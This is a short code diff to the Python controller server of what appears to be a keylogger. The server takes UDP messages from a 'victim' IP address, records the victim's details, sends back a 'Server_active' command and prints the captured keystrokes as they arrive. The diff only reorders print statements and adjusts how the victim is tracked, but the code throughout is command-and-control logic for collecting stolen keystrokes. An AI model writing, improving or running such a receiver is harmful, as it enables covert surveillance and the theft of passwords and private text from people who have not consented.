@@ -97,19 +97,19 @@ class ControllerServer:
                     signal = data.get("signal", False)
                     ip_victim = data.get("from_ip", None)
 
-                    self.ip_victim = ip_victim
-
                     if self.ip_victim is None or self.ip_victim != ip_victim:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
-                        print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
                         self.info_victim = data_str
-                        # print(data_str)
+                        print(self.info_victim)
+                        continue
 
                     if signal:
                         self.buffer += data_str
                         os.system('clear')
                         print("\033[32m" + banner + "\033[0m")
+                        print(self.info_victim)
+                        print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
                         print("Keystroke operation ->", self.buffer)
                         print("Enter 'stop' to stop, 'exit' to quit... ->")
                     else:
